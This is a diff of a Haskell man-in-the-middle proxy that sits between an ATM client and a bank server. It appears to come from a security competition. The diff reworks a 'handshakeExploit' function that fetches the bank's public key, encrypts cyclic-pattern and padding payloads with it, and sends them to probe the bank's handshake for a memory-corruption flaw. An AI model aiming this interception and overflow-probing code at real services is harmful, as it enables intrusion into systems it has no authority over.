@@ -41,7 +41,7 @@ main' _ = getProgName >>= \name -> putStrLn $ "Usage: " ++ name ++ " ATM_PORT BA
 
 main'' atmPort bankPort = do
     listener <- listenOn atmPort
-    forkIO $ connectTo "localhost" bankPort >>= handshakeExploit
+    --handshakeExploit bankPort
     forever $ accept listener >>= forkIO . doMitm bankPort
 
 dumbProxy atm bank logTo logFrom = loop where
@@ -120,29 +120,43 @@ mitmHandshake atm bank logTo logFrom = do
     return (aes, aesIV)
 
 
-handshakeExploit bank = do
+handshakeExploit bankPort = do
     let bufferSize = 4096
     let pubSizeBits = 3072
-    B.hPut bank "DUMMY"
-    bankPubRaw <- B.hGetSome bank bufferSize
-    let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
-    let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
-    print bankPub'
+    let sendPayload h payload k = do
+        B.hPut h "DUMMY"
+        bankPubRaw <- B.hGetSome h bufferSize
+        let Just bankPub = decodeX509Pubkey (L.fromChunks [bankPubRaw])
+        let bankPub' = bankPub { public_size = pubSizeBits `div` 8 } -- fiddle with things to get them to work
+        --print bankPub'
+        putStr "Raw Payload: "
+        print $ payload
+        Right encPayload <- encrypt (defaultOAEPParams SHA1) bankPub' $ payload
+        putStr "Encrypted Payload: "
+        print $ encPayload
+        B.hPutStr h encPayload
+        k h bankPub'
+    {-
+    let continuation1 h bankPub' = do
+        Right encIV <- encrypt (defaultOAEPParams SHA1) bankPub' $ B.replicate 20 0x43
+        expect h "DUMMY"
+        B.hPutStr h encIV
+        B.hPutStr h "dummy"
+        expect h "DUMMY"
+        hClose h
+        putStrLn "end"
+    -}
+    let continuation2 h _ = do
+        hClose h
     --let payload = B.replicate 342 0x41
-    let payload' = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka"
-    let payload = B.concat [B.replicate 36 0x41, B.replicate 4 1, B.replicate 302 0x42]
-    putStr "Raw Payload: "
-    print $ payload
-    Right encPayload <- encrypt (defaultOAEPParams SHA1) bankPub' $ payload
-    putStr "Encrypted Payload: "
-    print $ encPayload
-    B.hPutStr bank encPayload
-    Right encIV <- encrypt (defaultOAEPParams SHA1) bankPub' $ B.replicate 20 0x43
-    expect bank "DUMMY"
-    B.hPutStr bank encIV
-    B.hPutStr bank "dummy"
-    expect bank "DUMMY"
-
+    let payload1 = "AAAABAAACAAADAAAEAAAFAAAGAAAHAAAIAAAJAAAKAAALAAAMAAANAAAOAAAPAAAQAAARAAASAAATAAAUAAAVAAAWAAAXAAAYAAAZAABBAABCAABDAABEAABFAABGAABHAABIAABJAABKAABLAABMAABNAABOAABPAABQAABRAABSAABTAABUAABVAABWAABXAABYAABZAACBAACCAACDAACEAACFAACGAACHAACIAACJAACKAACLAACMAACNAACOAACPAACQAACRAACSAACTAACUAACVAACWAACXAACYAACZAADBAADCAADDAADEAADFAADGAADHAADIAADJAADKA"
+    let payload2 = "ZZZZYZZZXZZZWZZZVZZZUZZZTZZZSZZZRZZZQZZZPZZZOZZZNZZZMZZZLZZZKZZZJZZZIZZZHZZZGZZZFZZZEZZZDZZZCZZZBZZZAZZYYZZYXZZYWZZYVZZYUZZYTZZYSZZYRZZYQZZYPZZYOZZYNZZYMZZYLZZYKZZYJZZYIZZYHZZYGZZYFZZYEZZYDZZYCZZYBZZYAZZXYZZXXZZXWZZXVZZXUZZXTZZXSZZXRZZXQZZXPZZXOZZXNZZXMZZXLZZXKZZXJZZXIZZXHZZXGZZXFZZXEZZXDZZXCZZXBZZXAZZWYZZWXZZWWZZWVZZWUZZWTZZWSZZWRZZWQZZWPZ"
+    --let payload = B.concat [B.replicate 36 0x41, B.replicate 4 1, B.replicate 302 0x42]
+    --let payload = payload'
+    bank1 <- connectTo "localhost" bankPort
+    sendPayload bank1 payload1 continuation2
+    bank2 <- connectTo "localhost" bankPort
+    sendPayload bank2 payload2 continuation2
 
 data ActionType = Balance | Deposit | Login | Logout | Malformed | Transfer | Unknown | Withdraw
     deriving (Enum, Eq, Show)
